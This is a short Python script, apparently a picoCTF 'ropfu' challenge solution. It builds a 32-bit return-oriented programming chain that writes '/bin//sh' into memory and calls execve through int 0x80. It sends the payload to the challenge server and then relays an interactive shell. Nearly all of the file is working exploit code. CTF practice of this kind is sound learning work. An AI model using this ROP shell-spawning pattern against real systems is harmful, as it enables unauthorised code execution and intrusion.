# ropfu solution

import socket
import sys

# BUF value starts from 0x80e8320
# 16 + FODDER 12 = 28 bytes

site = "saturn.picoctf.net"
port = 61611

# Payload
fill_ebp = b"1234"

# Writable sections
writable_bss =  b"\xc0\x62\x0e\x08"
writable_bss2 = b"\xc4\x62\x0e\x08"
writable_bss3 = b"\xcc\x62\x0e\x08"

# final outcome
feax = b"\x0b\x00\x00\x00"   # execve syscall (11)
febx = writable_bss          # bin/sh location
fedx = b"\x00" * 4           # should be 000000000


# ROP Gadgets of vuln
pop_eax_edx_ebx_ret = b"\xc8\x83\x05\x08" # pop %eax, %edx, %ebx, ret
pop_ecx_ret = b"\x39\x9e\x04\x08"   # pop %ecx, ret

# Access writable memory
mov_eax_aedx_ret = b"\x02\x91\x05\x08" # mov %eax -> (%edx), ret

# Syscall
i80_ret = b"\x50\x16\x07\x08"


buf = (b"M" * 24) + fill_ebp

buf += pop_eax_edx_ebx_ret + b"/bin" + writable_bss + writable_bss
buf += mov_eax_aedx_ret
buf += pop_eax_edx_ebx_ret + b"//sh" + writable_bss2 + writable_bss
buf += mov_eax_aedx_ret
buf += pop_eax_edx_ebx_ret + writable_bss + writable_bss3 + writable_bss
buf += mov_eax_aedx_ret

buf += pop_ecx_ret + fedx
buf += pop_eax_edx_ebx_ret + feax + fedx + febx

buf += i80_ret

# Connect to remote app

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((site, port))

intro = s.recv(1024)
print(intro)
s.send(buf + b"\n")
while True:
    l = sys.stdin.readline()
    s.send(l)
    recv = s.recv(1024)
    print(recv)
    if l == b"exit\n":
        break

s.close()


